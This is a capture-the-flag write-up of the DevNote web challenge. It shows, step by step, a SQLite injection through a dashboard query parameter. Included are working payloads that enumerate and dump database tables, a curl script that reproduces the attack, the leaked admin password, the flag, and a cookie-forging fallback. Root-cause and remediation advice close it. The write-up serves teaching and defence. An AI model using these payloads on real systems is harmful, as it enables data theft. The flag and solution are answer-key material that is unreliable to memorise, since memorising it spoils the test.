# DevNote 10 — "Are you privileged enough to get the flag?"

Full walkthrough: exactly what we saw, how each next step was decided, and where we
changed perspective.

- **Challenge:** DevNote (labelled `10`, hint: *"Are you privileged enough to get the flag"*)
- **Target:** `http://kicyber-81cdac2d8817-devnote-0-0.chals.io`
- **Category:** Web / SQL Injection (SQLite)
- **Flag format:** `KPMG_CTF{...}`
- **Instance status at writeup time:** stopped (proxy returns `Couldn't find underlying service`)

## Flag

```
KPMG_CTF{_YD6yhbWjlH1AyuIZtztcelgNRN2VA1HiVn-bZh4djGW}
```

---

## 0. What the challenge told us before we touched it

Wappalyzer fingerprint of the landing page:

| Group | Technology | Version |
|---|---|---|
| Web frameworks | Flask | 3.1.8 |
| Web servers | Flask | 3.1.8 |
| Programming languages | Python | 3.11.15 |

The hint — *"Are you privileged enough to get the flag"* — frames this as a
**privilege / authorization** problem. That frame is a red herring that we will deliberately
break later (see **Perspective shift #4**).

---

## 1. First contact — seeing the app

### 1.1 Plain HTTP is redirected to HTTPS

```http
GET / HTTP/1.1
Host: kicyber-81cdac2d8817-devnote-0-0.chals.io
```

```http
HTTP/1.1 301 Moved Permanently
Server: openresty/1.27.1.2
Date: Sat, 10 Oct 2026 19:25:01 GMT
Content-Type: text/html
Content-Length: 175
Connection: keep-alive
Location: https://kicyber-81cdac2d8817-devnote-0-0.chals.io/
```

`openresty/1.27.1.2` is the CTF platform's edge proxy, not the app. Follow the redirect.

### 1.2 The login page (raw response body)

```http
GET / HTTP/1.1
Host: kicyber-81cdac2d8817-devnote-0-0.chals.io
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.11.15
Date: Sat, 10 Oct 2026 19:25:06 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 540
Connection: close
```

```html
<html>
<head><title>Login</title>
<style>
body { font-family: sans-serif; background:#0f0f0f; color:#eee; }
.container { max-width:400px; margin:100px auto; }
input,button { width:100%; padding:10px; margin:10px 0; }
.error { color:red; }
</style>
</head>
<body>

<!--guest:guest123 -->

<div class="container">
<h2>DevNote Login</h2>



<form method="POST" action="/login">
<input name="username" placeholder="username">
<input name="password" placeholder="password" type="password">
<button>Login</button>
</form>

</div>
</body>
</html>
```

**Observations, in order of value:**

1. `Server: Werkzeug/3.1.8 Python/3.11.15` — confirms a **Flask dev server** (Werkzeug) is
   directly exposed. Two things follow:
   - Debug/error pages may be verbose (they leak stack traces → useful later).
   - `Werkzeug` dev server means single-process, simple routing.
2. `<!--guest:guest123 -->` — **an HTML comment with valid credentials.**
   This is the intended "way in": the challenge wants you authenticated as a
   low-privilege user before the real bug.
3. The form posts to `/login` with fields `username`, `password`.

### Perspective shift #1 — from "site" to "app with a known low-priv entrance"

We didn't brute force, enumerate directories, or fuzz at this stage. The app handed us a
credential, and the hint talks about privilege. So the plan changed from *"find the app"* to
*"get in as the least privileged user, then look for what that user is not supposed to see."*

---

## 2. Log in as guest — seeing what a normal user gets

```http
POST /login HTTP/1.1
Host: kicyber-81cdac2d8817-devnote-0-0.chals.io
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest123
```

```http
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJ1c2VybmFtZSI6Imd1ZXN0In0.asqRGg.JmhR5P9Tieb9iUyGfljOn4xAISI; HttpOnly; Path=/
```

Two important reads here:

- **The session cookie is a Flask signed cookie.** The first segment is
  `base64url({"username":"guest"})`. Decoding it:

  ```bash
  python3 - <<'PY'
  import base64,json
  print(json.loads(base64.urlsafe_b64decode("eyJ1c2VybmFtZSI6Imd1ZXN0In0"+"="*2)))
  # {'username': 'guest'}
  PY
  ```

  So authorization is a **client-held signed JSON blob** `{"username": ...}` — *if* we can get
  the Flask `SECRET_KEY`, we can forge an `admin` cookie. That becomes an alternate attack
  branch to keep in the back pocket.

- The cookie's second/third segments are the session id (timestamp) and HMAC signature.

### 2.1 The dashboard (raw body)

```http
GET /dashboard HTTP/1.1
```

```html
<html>
<head><title>Dashboard</title> ... </head>
<body>
<div class="container">
<h2>Welcome guest</h2>

<p><b>Note:</b> Only admin should have access to sensitive data.</p>

<p><b>Dev Query Interface (internal use):</b></p>
<code>/dashboard?q=</code>

<a href="/logout">Logout</a>
</div>
</body>
</html>
```

**This is the pivotal screen.** Two clues:

1. *"Only admin should have access to sensitive data."* → there **is** sensitive data
   (probably a flag) that admin can reach and guest cannot.
2. *"Dev Query Interface (internal use): `/dashboard?q=`"* → a parameterised interface that is
   clearly meant for internal/debug use but is exposed to guest.

### Perspective shift #2 — from "escalate the role" to "abuse the internal interface"

The hint says *privileged*, which pushes you toward logging in as admin. But the dashboard
advertises a **query interface** to a guest. That is a much richer target: if `q` is dropped
into SQL by hand, we don't need admin privileges at all — we can read admin-only data as guest.
We chase the query interface first.

---

## 3. Interrogating `q` — turning "query interface" into an injection

Each request is `GET /dashboard?q=<value>`. All observations are verbatim from the `Query
Result` block.

| `q=` | Response `<pre>` | What it tells us |
|---|---|---|
| `test` | `no such column: test` | Input is used **raw as an identifier**; SQLite error leaked |
| `guest` | `no such column: guest` | Same — not a quoted string value |
| `1` | `[{'1': 1}]` | A bare `SELECT 1` executes and returns rows |
| `1,2` | `[{'1': 1, '2': 2}]` | Multiple expressions accepted → we're in the **select list** |
| `*` | `no tables specified` | `SELECT *` with **no FROM clause** exists |
| `sqlite_version()` | `[{'sqlite_version()': '3.46.1'}]` | Arbitrary SQL **functions** execute |
| `name` / `username` / `password` / `title` / `id` | `no such column: ...` | No table is in scope yet |

### Perspective shift #3 — the injection is in the SELECT *column list*, not a WHERE value

This is the key re-frame. Most SQLi are `WHERE id = '<input>'`. Here `q` is placed directly
after `SELECT`, so the surrounding query is essentially:

```sql
SELECT {q}          -- e.g. SELECT 1
```

That means we don't inject a condition — **we inject a whole `FROM` clause**:

```
q = 1 FROM sqlite_master
  → SELECT 1 FROM sqlite_master
```

The moment we realised this, the challenge collapsed from "privilege escalation" to "full
read-only database access", no admin needed.

---

## 4. Enumerating the schema

**Table names:**

```
GET /dashboard?q=group_concat(name) FROM sqlite_master WHERE type='table'
```

```html
<pre>[{'group_concat(name)': 'users,secrets'}]</pre>
```

**Full DDL:**

```
GET /dashboard?q=group_concat(name||':'||sql, char(10)) FROM sqlite_master
```

```html
<pre>[{"group_concat(name||':'||sql, char(10))": "users:CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT,
                password TEXT
            )
secrets:CREATE TABLE secrets (
                id INTEGER PRIMARY KEY,
                data TEXT
            )"}]</pre>
```

Two tables:

- `users(id, username, password)` — app accounts.
- `secrets(id, data)` — the "sensitive data" the note warned about. This is where the flag lives.

---

## 5. Dumping the data

**Users:**

```
GET /dashboard?q=group_concat(id||':'||username||':'||password, char(10)) FROM users
```

```html
<pre>[{"group_concat(id||':'||username||':'||password, char(10))": "1:admin:Adm1n_Ultra_S3cr3t!
2:dev:devpassword123
3:guest:guest123"}]</pre>
```

**Secrets (the flag):**

```
GET /dashboard?q=group_concat(id||':'||data, char(10)) FROM secrets
```

```html
<pre>[{"group_concat(id||':'||data, char(10))": "1:KPMG_CTF{_YD6yhbWjlH1AyuIZtztcelgNRN2VA1HiVn-bZh4djGW}"}]</pre>
```

```
KPMG_CTF{_YD6yhbWjlH1AyuIZtztcelgNRN2VA1HiVn-bZh4djGW}
```

---

## 6. Confirming the "privileged" framing (and why it didn't matter)

Using the recovered admin credential, we verified the intended path:

```http
POST /login HTTP/1.1

username=admin&password=Adm1n_Ultra_S3cr3t!
```

```http
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.asqRVw.ToLLsIoQigHE850hPXSneROzRFA; HttpOnly; Path=/
```

```bash
python3 - <<'PY'
import base64,json
print(json.loads(base64.urlsafe_b64decode("eyJ1c2VybmFtZSI6ImFkbWluIn0"+"="*2)))
# {'username': 'admin'}
PY
```

The admin dashboard body **does not print the secret directly** — it still only shows the
query interface. In other words, being "privileged" (admin) does not itself reveal the flag;
the flag is only reachable by *querying the `secrets` table through the interface*. So the real
bug is the interface for **everyone**, and the guest path is strictly faster than the
admin path.

### Perspective shift #4 — the hint's premise is wrong

- The hint implies: *become privileged → get flag.*
- Reality: *the privilege boundary is not enforced at the data layer* — a guest can read the
  admin-only `secrets` table via `/dashboard?q=`. We never needed admin, and in fact extracting
  the admin password was just a bonus, not the objective.

### Alternate branch we deliberately did **not** need

Because the session is a Flask signed cookie containing `{"username":"..."}`, the "classic"
solution would be to recover the `SECRET_KEY` and forge an `admin` session:

- Try to leak `SECRET_KEY` from a Werkzeug debug traceback, config, or env.
- Then `flask-unsign --sign --cookie '{"username":"admin"}' --secret <key>`.

We noted this as a fallback, but the SQLi gave the flag directly, so forging was unnecessary.

---

## 7. Complete reproduction (one shot)

```bash
BASE=https://kicyber-81cdac2d8817-devnote-0-0.chals.io

# 1) login as the leaked guest user
curl -sk -c c.txt -d 'username=guest&password=guest123' "$BASE/login" -o /dev/null

# 2) enumerate tables
curl -sk -b c.txt --get "$BASE/dashboard" \
  --data-urlencode "q=group_concat(name) FROM sqlite_master WHERE type='table'"

# 3) dump the flag
curl -sk -b c.txt --get "$BASE/dashboard" \
  --data-urlencode "q=group_concat(data, char(10)) FROM secrets"
```

Result:

```
KPMG_CTF{_YD6yhbWjlH1AyuIZtztcelgNRN2VA1HiVn-bZh4djGW}
```

---

## 8. Attack chain summary

1. **Fingerprint** → Flask 3.1.8 / Python 3.11.15 / Werkzeug dev server; login page.
2. **Read source** → HTML comment `<!--guest:guest123 -->` = low-priv foothold.
3. **Land on dashboard** → copy reveals admin-only "sensitive data" and an exposed
   `Dev Query Interface` at `/dashboard?q=`.
4. **Probe `q`** → `sqlite_version()` works, `*` says "no tables specified" ⇒ `q` is injected
   into the **column list** of a bare `SELECT {q}`.
5. **Control the `FROM`** → `q=... FROM sqlite_master` enumerates `users` and `secrets`.
6. **Dump** → users (incl. admin password) and the flag from `secrets`.
7. **Confirm** → admin login also works; admin no longer required.

---

## 9. Root cause & remediation

**Root cause.** The handler builds SQL by direct string interpolation and gives the user
control of the *column expression*:

```python
# vulnerable (reconstructed)
q = request.args.get("q", "")
rows = db.execute(f"SELECT {q}").fetchall()      # SELECT <user input>
```

Because `q` sits immediately after `SELECT`, the attacker can append an arbitrary `FROM`,
`WHERE`, `UNION`, sub-select, and SQLite functions — bypassing the entire notion of "only
admin sees sensitive data". The Werkzeug dev server also leaked the exact phrasing
(`no such column`, `no tables specified`) that made the injection trivial to identify.

**Fix.**

1. **Never interpolate user input into SQL.** Use bound parameters:
   ```python
   db.execute("SELECT data FROM secrets WHERE owner = ?", (current_user,))
   ```
2. **Don't let users pick arbitrary expressions/columns.** Replace `/dashboard?q=` with a
   fixed map of allowed query names → predefined statements, or remove the interface from
   deployed builds entirely.
3. **Enforce authorization at the data layer**, not by hiding UI — the "only admin" note was
   cosmetic; the server must actually reject non-admin access to `secrets`.
4. **Don't run the Werkzeug dev server in production**; use a real WSGI server and disable
   verbose error messages.
5. **Rotate the leaked credential** and stop putting secrets in HTML comments.

---

## 10. Approach timeline (where we changed perspective)

| Phase | Looking at | Naive next step | What we actually did / why we shifted |
|---|---|---|---|
| 0 | Wappalyzer + hint | "priv-esc challenge" | Framed as authz, but stayed open to other bug classes |
| 1 | Login page | brute force / fuzz | **Shift:** page leaked `guest:guest123` → just log in |
| 2 | Guest dashboard | try to become admin | **Shift:** note names hidden data + exposed dev query interface → target the interface |
| 3 | `q` parameter | treat as search / WHERE inj | **Shift:** `*` → "no tables specified" ⇒ injection is the **column list**; inject a `FROM` |
| 4 | Schema/data | forge Flask cookie for admin | **Shift:** SQLi already reads `secrets`; privilege boundary is unenforced → flag as guest |
| 5 | Admin creds | "now get flag as admin" | Verified admin works, but confirmed admin is **not** the gate — the interface is. |

**One-line lesson:** when a hint talks about privilege, don't trust that the privilege check is
real — find the data path and test whether it actually enforces it.
